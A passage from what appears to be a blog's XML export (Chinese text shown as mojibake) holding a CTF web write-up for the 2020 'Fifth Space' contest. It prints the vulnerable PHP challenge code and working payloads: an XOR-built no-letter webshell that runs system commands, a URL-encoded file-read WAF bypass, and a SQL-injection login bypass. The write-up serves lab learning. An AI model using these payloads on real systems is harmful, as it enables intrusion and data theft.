<li>æœ€åå¯ä»¥ç»Ÿè®¡ä¸€ä¸‹è¿”å›No Such Nameçš„å“åº”æ•°æ®åŒ…
<ul>
<li>ç‰¹å¾å­—æ®µï¼š<code>dns.flags.rcode</code>
<ul>
<li><code>dns.flags.rcode != 0(No Error)</code>
<ul>
<li><code>dns.flags.rcode == 3(No such name)</code> â€”&gt; DoSæ”»å‡»</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>æµé‡åˆ†æ</category>
        <category>æ¯”èµ›é¢˜</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>æµé‡åˆ†æ</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>2020â€œç¬¬äº”ç©ºé—´â€æ™ºèƒ½å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›CTF-Webå¤ç›˜</title>
    <url>/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web/</url>
    <content><![CDATA[<h1 id="2020â€œç¬¬äº”ç©ºé—´â€æ™ºèƒ½å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›CTF-Webå¤ç›˜">2020â€œç¬¬äº”ç©ºé—´â€æ™ºèƒ½å®‰å…¨å¤§èµ›çº¿ä¸Šèµ›CTF Webå¤ç›˜</h1>
<h2 id="hate-php-Solved">hate-php [Solved]</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>æ— å­—æ¯webshell</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You are too good for me&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;You deserve better&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°è¿™ä¸ªé¢˜ç¬¬ä¸€ååº”å°±æ˜¯æ— å­—æ¯webshellï¼Œå‚è€ƒ<a href="https://ca0y1h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/">è¿™ç¯‡æ–‡ç« </a>ã€‚</p>
<p>ä½†æ˜¯åˆä¸å¤ªä¸€æ ·ï¼Œé¢˜ç›®æœ‰ä¸¤å±‚è¿‡æ»¤ï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›ç¬¦å·äº†<code>flag.ph</code>ä¸­ä»»æ„çš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ª<code>foreach</code>è¿‡æ»¤äº†æ‰€æœ‰å†…ç½®å‡½æ•°ã€‚</p>
<h4 id="å–å">å–å</h4>
<p>åˆ©ç”¨ä¸‹é¢çš„è„šæœ¬å–åï¼Œæ„é€ <code>system(end(getallheaders()))</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">shell</span>):</span></span><br><span class="line">    hexbit=<span class="string">&#x27;&#x27;</span>.join(map(<span class="keyword">lambda</span> x: hex(~(-(<span class="number">256</span>-ord(x)))),shell))</span><br><span class="line">    print(hexbit)</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨headeræœ€ååŠ ä¸Š<code>cat flag.php</code>å³å¯ã€‚</p>
<h4 id="å¼‚æˆ–">å¼‚æˆ–</h4>
<p>å‚è€ƒè¿™ç¯‡<a href="https://www.meiyoubug.com/article/25252.html">æ–‡ç« </a>ï¼Œç®€å•åˆ†æä¸€ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿™é“é¢˜æ›´ä¸ºä¸¥æ ¼ï¼š</p>
<ol>
<li>ä¼ å…¥çš„å­—ç¬¦é•¿åº¦ä¸èƒ½è¶…è¿‡18ï¼›</li>
<li>ç»•è¿‡preg_marchæ­£åˆ™è¡¨è¾¾å¼</li>
<li>count_chars()&gt;12çš„é‡å¤å­—ç¬¦ä¸²ç»•è¿‡</li>
</ol>
<p>ç¬¬ä¸€ä¸ªå¯ä»¥ç”¨æ„é€ <code>_GET[x]</code>æ¥ç»•è¿‡ï¼Œé‡ç‚¹æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„ç»•è¿‡ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹è¿‡æ»¤äº†ä»€ä¹ˆå­—ç¬¦ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200628102723.png" alt=""></p>
<p>æŸ¥çœ‹å½“å‰å¯ä»¥é€šè¿‡æ­£åˆ™æ£€æµ‹çš„å­—ç¬¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">256</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>,chr($i)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="comment">#echo chr($i);</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å†ç”¨ä¸‹é¢çš„è„šæœ¬æ‰¾åˆ°èƒ½å¼‚æˆ–å‡º<code>_GET</code>çš„å­—ç¬¦ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">33</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">128</span>,<span class="number">129</span>,<span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">144</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,<span class="number">160</span>,<span class="number">161</span>,<span class="number">162</span>,<span class="number">163</span>,<span class="number">164</span>,<span class="number">165</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">168</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">171</span>,<span class="number">172</span>,<span class="number">173</span>,<span class="number">174</span>,<span class="number">175</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,<span class="number">190</span>,<span class="number">191</span>,<span class="number">192</span>,<span class="number">193</span>,<span class="number">194</span>,<span class="number">195</span>,<span class="number">196</span>,<span class="number">197</span>,<span class="number">198</span>,<span class="number">199</span>,<span class="number">200</span>,<span class="number">201</span>,<span class="number">202</span>,<span class="number">203</span>,<span class="number">204</span>,<span class="number">205</span>,<span class="number">206</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">209</span>,<span class="number">210</span>,<span class="number">211</span>,<span class="number">212</span>,<span class="number">213</span>,<span class="number">214</span>,<span class="number">215</span>,<span class="number">216</span>,<span class="number">217</span>,<span class="number">218</span>,<span class="number">219</span>,<span class="number">220</span>,<span class="number">221</span>,<span class="number">222</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">225</span>,<span class="number">226</span>,<span class="number">227</span>,<span class="number">228</span>,<span class="number">229</span>,<span class="number">230</span>,<span class="number">231</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">234</span>,<span class="number">235</span>,<span class="number">236</span>,<span class="number">237</span>,<span class="number">238</span>,<span class="number">239</span>,<span class="number">240</span>,<span class="number">241</span>,<span class="number">242</span>,<span class="number">243</span>,<span class="number">244</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">247</span>,<span class="number">248</span>,<span class="number">249</span>,<span class="number">250</span>,<span class="number">251</span>,<span class="number">252</span>,<span class="number">253</span>,<span class="number">254</span>,<span class="number">255</span>,]</span><br><span class="line"><span class="comment">#aæ˜¯ä¸Šé¢çš„phpè„šæœ¬å‡ºæ¥çš„æ•°æ®ï¼Œé€šè¿‡preg_matchçš„å­—ç¬¦</span></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">27</span>:]:<span class="comment">#æˆªå–aåˆ—è¡¨27åé¢çš„æ•°æ®ï¼Œç›®çš„æ˜¯é¿å¼€å¯è§†å­—ç¬¦ã€‚æˆ‘ä»¬éœ€è¦ä¸å¯è§†å­—ç¬¦æ¥å¼‚æˆ–</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a[<span class="number">27</span>:]:</span><br><span class="line">        tem=(i^j)</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">&quot;_&quot;</span>):</span><br><span class="line">            _.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">&quot;G&quot;</span>):</span><br><span class="line">            G.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem) == <span class="string">&quot;E&quot;</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            E.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem)== <span class="string">&quot;T&quot;</span>):</span><br><span class="line">            T.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">&quot;*&quot;</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">print(_)</span><br><span class="line">print(G)</span><br><span class="line">print(E)</span><br><span class="line">print(T)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200628121017.png" alt=""></p>
<p>æœ‰å¾ˆå¤šï¼Œç”¨ç¬¬ä¸€ä¸ªæ¥å¯¹åŸé¢˜è¯•ä¸€è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%87&#125;)&amp;%86&#x3D;system&amp;%87&#x3D;cat%20flag.php</span><br></pre></td></tr></table></figure>
<h3 id="åè®°">åè®°</h3>
<p>CTFhubä¸Šé¢ç°åœ¨æœ‰è¿™é“é¢˜çš„å¤ç°ç¯å¢ƒï¼Œä½†æ˜¯æˆ‘å‘ç°ç”¨<a href="https://www.gem-love.com/ctf/2380.html">y1ngå¸ˆå‚…</a>å’Œ<a href="http://igml.top/2020/06/25/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/">gmlå¸ˆå‚…</a>çš„payloadéƒ½ä¼šä¸è¡Œï¼Œç”¨æˆ‘è¿™ä¸ªå¼‚æˆ–æ–¹å¼çš„payloadå¯ä»¥æ­£å¸¸å›æ˜¾ã€‚</p>
<h2 id="do-you-know-solved">do you know [solved]</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>ä»£ç å®¡è®¡</li>
<li>SSRF + XXE</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#æœ¬é¢˜æ— æ³•è®¿é—®å¤–ç½‘</span></span><br><span class="line"><span class="comment">#è¿™é¢˜çœŸæ²¡æœ‰å…¶ä»–æ–‡ä»¶ï¼Œè¯·ä¸è¦å†å¼€ç›®å½•æ‰«æå™¨äº†ï¼Œæœ‰çš„æ–‡ä»¶æˆ‘éƒ½åœ¨æ³¨é‡Šé‡Œé¢å‘Šè¯‰ä½ ä»¬äº†</span></span><br><span class="line"><span class="comment">#å„ä½å¤§ä½¬...è¿™é¢˜éƒ½æ²¡æœ‰æ•°æ®åº“çš„å­˜åœ¨...éº»çƒ¦ä¸è¦ç”¨å·¥å…·æ‰«æˆ‘äº†å¥½ä¸å¥½</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/log|flag|hist|dict|etc|file|write/i&quot;</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">&#x27;&amp;&#x27;</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">&#x27;=&#x27;</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;æˆ‘ä»€ä¹ˆéƒ½æ²¡æœ‰~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;trick&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;be it so&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">&#x27;file&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, &#x27;post_data&#x27;);</span></span><br><span class="line">        <span class="comment">// è®¾ç½®è¶…æ—¶</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// è®¾ç½®è¶…æ—¶</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">&#x27;file&#x27;</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">&quot;content-type: multipart/form-data; charset=UTF-8&quot;</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">&#x27;xml&#x27;</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">&quot;content-type: application/json; charset=UTF-8&quot;</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// è¦æ±‚ç»“æœä¸ºå­—ç¬¦ä¸²ä¸”è¾“å‡ºåˆ°å±å¹•ä¸Š</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨è¯ä¹¦ï¼šcert ä¸ key åˆ†åˆ«å±äºä¸¤ä¸ª.pemæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure>
<h4 id="é¢„æœŸè§£">é¢„æœŸè§£</h4>
<p>æ€è·¯ï¼šç”¨<code>gopher</code>è¿›è¡Œ<code>ssrf</code>å‘é€<code>post</code>è¯·æ±‚ç»™<code>xxe.php</code></p>
<p>å…ˆç•™ä¸€ä¸ªå‘ä½ï¼Œç­‰ä¸€æ‰‹å¤ç°ç¯å¢ƒï¼š<a href="https://blog.csdn.net/a3320315/article/details/106960331">https://blog.csdn.net/a3320315/article/details/106960331</a></p>
<h4 id="éé¢„æœŸè§£">éé¢„æœŸè§£</h4>
<p>è¿™é‡Œåˆ©ç”¨äº†<code>$_SERVER['QUERY_STRING'];</code>ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œä½†æ˜¯åé¢èµ‹å€¼æ˜¯$_GETèµ‹çš„å€¼ï¼Œä¿å­˜çš„æ˜¯è§£ç åçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´wafæ£€æµ‹çš„æ˜¯urlè§£ç å‰çš„valueï¼Œç›´æ¥å°† file:///var/www/html/flag.php è¿›è¡Œurlç¼–ç ï¼Œå¯ä»¥æ‹¿åˆ°flagã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.36.64.91&#x2F;?a&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</span><br></pre></td></tr></table></figure>
<h2 id="Laravel-unsolved">Laravel [unsolved]</h2>
<blockquote>
<p>æºç ä¸‹è½½ï¼š</p>
<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1WEWSkDzyE5MXSh9CXQ-q3A">https://pan.baidu.com/s/1WEWSkDzyE5MXSh9CXQ-q3A</a><br>
æå–ç ï¼šp88e</p>
</blockquote>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>PHPååºåˆ—åŒ– POPé“¾</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<blockquote>
<p>å…ˆç•™ä¸€ä¸ªå‘ï¼Œå…ˆæŠŠPHPçš„ä¾èµ–æ³¨å…¥çš„çŸ¥è¯†å­¦å®Œï¼Œä¸ç„¶çœ‹æºç æœ‰ç‚¹åƒåŠ›ã€‚</p>
</blockquote>
<h2 id="ç¾å›¢å¤–å–-unsolved">ç¾å›¢å¤–å– [unsolved]</h2>
<blockquote>
<p>æºç ä¸‹è½½ï¼š</p>
<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1sjERSDUUOf0O63BLqW1hZw">https://pan.baidu.com/s/1sjERSDUUOf0O63BLqW1hZw</a><br>
æå–ç ï¼š359o</p>
</blockquote>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>SQLæ³¨å…¥</li>
<li>ä»£ç å®¡è®¡</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<blockquote>
<p>æš‚æ—¶è¿˜æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œåªèƒ½äº‘åšé¢˜äº†ï¼Œå‚è€ƒï¼š</p>
<p><a href="https://www.gem-love.com/ctf/2380.html">https://www.gem-love.com/ctf/2380.html</a></p>
<p><a href="http://igml.top/2020/06/25/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/">http://igml.top/2020/06/25/2020-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›åˆèµ›wp/</a></p>
</blockquote>
<p>æ‰«å‡ºæ¥www.zipæºç </p>
<p>é¦–å…ˆæ˜¯ä¸ªç™»å½•æ¡†ï¼Œçœ‹æºç å°±å¾ˆåƒGXYCTF2019  EasySQLiv1.0é‚£é“é¢˜çš„md5ç»•è¿‡ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701194151.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·å : &#39; union select &quot;0f5ed8a8d8d44d86a570aacffa922251&quot;#</span><br><span class="line">å¯†ç   : ca01h</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ç™»å½•ï¼Œä½†æ˜¯sessioné‡Œé¢çš„userä¸æ˜¯adminã€‚ç»§ç»­å®¡è®¡åˆ°<code>daochu.php</code>ï¼ŒSQLæ³¨å…¥æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œè¿˜æœ‰å›æ˜¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701195332.png" alt=""></p>
<p>å¸¸è§„çš„SQLè”åˆæ³¨å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701195606.png" alt=""></p>
<p>æœ‰ä¸ªhintè¡¨ï¼Œæ¥ç€è¯»åˆ—åæ˜¯hintsã€‚å†dumpæ•°æ®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701195655.png" alt=""></p>
<p>ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•ï¼Œå’Œä¸»é¡µä¸€æ ·çš„ç•Œé¢ï¼Œç„¶è€Œè¿™é‡Œé¢æ²¡æœ‰www.zipäº†ï¼Œæ¥ä¸‹æ¥ç«Ÿç„¶è¦å»libæ–‡ä»¶å¤¹é‡Œé¢å»å®¡è®¡ã€‚ã€‚ã€‚ğŸ˜“</p>
<p>å¯ä»¥ç›´æ¥ç”¨findå‘½ä»¤æ‰¾ä¸€ä¸‹PHPç±»å‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸”æŸ¥çœ‹æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶ï¼Œæœ€åå®šä½åˆ°<code>lib/webuploader/0.1.5/server/preview.php</code>ï¼Œå…³é”®ä»£ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701200516.png" alt=""></p>
<p>æ„é€ ä¸€ä¸ªç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„POSTæ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:image&#x2F;test;base64,test</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®è¿”å›äº†ä¸€ä¸ªç¥ç§˜æ–‡ä»¶ï¼Œè®¿é—®ä¹‹åæç¤ºget fileï¼Œæ‰€ä»¥å°±ç›´æ¥è¯»flagå°±å¯ä»¥äº†ã€‚</p>
<blockquote>
<p>è¿˜æœ‰ä¸€ç§è§£æ³•æ˜¯webuploader 0.1.5çš„å…¬å¼€æ¼æ´ï¼š</p>
<p><a href="https://9finger.cn/2020/03/06/CNVD-2018-26054%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://9finger.cn/2020/03/06/CNVD-2018-26054æ¼æ´å¤ç°/#æ¼æ´åˆ†æ</a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>é¦–å±Šé’“é±¼åŸæ¯CTFæ¯”èµ›</title>
    <url>/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/</url>
    <content><![CDATA[<h1 id="â€œé’“é±¼åŸæ¯â€å›½é™…ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›Writeup">â€œé’“é±¼åŸæ¯â€å›½é™…ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›Writeup</h1>
<h2 id="easyseed">easyseed</h2>
<p>index.bakï¼š</p>
